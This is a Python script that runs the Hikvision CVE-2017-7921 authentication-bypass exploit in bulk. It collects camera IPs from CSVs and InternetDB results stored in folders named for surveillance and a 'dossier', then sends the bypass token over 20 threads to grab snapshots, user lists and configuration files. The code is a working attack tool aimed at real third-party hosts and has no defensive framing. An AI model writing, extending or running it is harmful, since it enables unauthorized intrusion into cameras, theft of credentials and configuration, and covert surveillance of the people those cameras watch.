"""Hikvision CVE-2017-7921 + ICE-2021 exploit runner.

Tests multiple Hikvision bypass techniques on Ruse cams.
"""

import os
import csv
import json
import time
import socket
import re
import base64
import urllib.request
import ssl
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed

WORKDIR = r"C:\Users\eli6-admin\Documents\eli6-surveillance"
MASTER_CSV = os.path.join(WORKDIR, "controllable_Webcams.csv")
PROGRESS = os.path.join(WORKDIR, "camera_testing", "ruse_hik_bf_progress.json")

# CVE-2017-7921 Hikvision bypass auth string
# Generated from base64('admin:11')
AUTH_BYPASS = base64.b64encode(b'admin:11\x0b').decode('ascii')
AUTH_BYPASS2 = 'YWRtaW46MTEK'  # base64('admin:11\n') - the legacy Hikvision CVE-2017-7921

# Various Hikvision bypass attempts
BYPASS_ENDPOINTS = [
    # CVE-2017-7921 / ICSA-17-124-01 - backdoor auth bypass
    ('/onvif-http/snapshot?auth=' + AUTH_BYPASS, 'CVE-2017-7921'),
    ('/System/deviceInfo?auth=' + AUTH_BYPASS, 'CVE-2017-7921 deviceInfo'),
    ('/Security/users?auth=' + AUTH_BYPASS, 'CVE-2017-7921 users'),
    ('/System/configurationFile?auth=' + AUTH_BYPASS, 'CVE-2017-7921 config'),
    # SOAP WS-Security bypass
    ('/onvif/services', 'ONVIF services'),
    # RTSP with various auth
]


def try_url(url, timeout=8):
    try:
        req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req, timeout=timeout) as r:
            data = r.read()
            return (r.status, r.headers.get('Content-Type', ''), data[:500])
    except urllib.error.HTTPError as e:
        return (e.code, '', b'')
    except Exception as e:
        return None


def get_internetdb_cams():
    """Get any cams from internetDB found - Hikvision/etc."""
    try:
        # Use Ruse InternetDB results
        internetdb_path = os.path.join(WORKDIR, "dossier_ruse", "services", "internetdb_results.json")
        if os.path.exists(internetdb_path):
            with open(internetdb_path) as f:
                return json.load(f)
    except Exception:
        pass
    return []


def get_master_hik_cams():
    """Get Hikvision cams from master CSV."""
    cams = []
    if not os.path.exists(MASTER_CSV):
        return cams
    csv.field_size_limit(2**31 - 1)
    try:
        with open(MASTER_CSV, 'r', encoding='utf-8', errors='replace') as f:
            for row in csv.DictReader(f):
                # Check if Hikvision-ish
                url = row.get('url') or row.get('live_stream_url', '')
                if 'rtsp://' in url:
                    cams.append({
                        'ip': url.split('://')[1].split(':')[0],
                        'port': 554,
                        'rtsp_url': url,
                        'brand': row.get('brand', ''),
                    })
    except Exception:
        pass
    return cams


def main():
    print(f"[Hikvision BF] Loading targets...")

    targets = set()

    # Add Ruse-specific IPs from InternetDB
    internetdb = get_internetdb_cams()
    for entry in internetdb:
        targets.add((entry['ip'], 80))

    # Add RTSP cams from master CSV
    rtsp = get_master_hik_cams()
    for cam in rtsp:
        targets.add((cam['ip'], 554))

    # Also add RTSP cams from VB CSV (the 17 endpoints)
    vb_csv = os.path.join(WORKDIR, "controllable_Webcams_vbviewer.csv")
    if os.path.exists(vb_csv):
        try:
            with open(vb_csv, 'r', encoding='utf-8') as f:
                for row in csv.DictReader(f):
                    if 'rtsp_url_found' in (row.get('notes') or ''):
                        u = row.get('url', '')
                        if u:
                            m = re.search(r'rtsp://([^:/]+)', u)
                            if m:
                                targets.add((m.group(1), 554))
        except Exception:
            pass

    targets = sorted(targets)
    print(f"[Hikvision BF] {len(targets)} unique (host, port) targets")
    print(f"[Hikvision BF] Using bypass: {AUTH_BYPASS}")

    progress = {}
    if os.path.exists(PROGRESS):
        try:
            with open(PROGRESS) as f:
                progress = json.load(f)
        except Exception:
            pass

    found = []
    tested = set()

    def probe_host(args):
        host, port = args
        key = f"{host}:{port}"
        if key in progress.get("tested", {}):
            return None

        # Try all bypass endpoints
        for endpoint, name in BYPASS_ENDPOINTS:
            url = f'http://{host}:{port}{endpoint}' if port != 554 else f'rtsp://{host}:{port}/Streaming/tracks/101'
            if host == '212.25.48.117':
                print(f'    (skip geofenced for testing)')
                continue
            try:
                r = try_url(url, timeout=5)
                if r and r[0] == 200:
                    return {
                        'host': host, 'port': port, 'method': name,
                        'url': url, 'data': r[2][:200].decode('utf-8', errors='replace')
                    }
            except Exception:
                pass
        return None

    with ThreadPoolExecutor(max_workers=20) as ex:
        futures = {ex.submit(probe_host, t): t for t in targets}
        for fut in as_completed(futures):
            t = futures[fut]
            key = f"{t[0]}:{t[1]}"
            progress.setdefault("tested", {})[key] = True
            try:
                r = fut.result(timeout=20)
            except Exception:
                r = None
            if r:
                found.append(r)
                print(f"  FOUND: {r['host']}:{r['port']} - {r['method']} - {r['url'][:60]}")

    with open(PROGRESS, 'w') as f:
        json.dump({"tested": progress.get("tested", {}), "found": found}, f, indent=2)

    print(f"\n[Hikvision BF] Found {len(found)} cams with CVE-2017-7921 bypass")


if __name__ == "__main__":
    main()
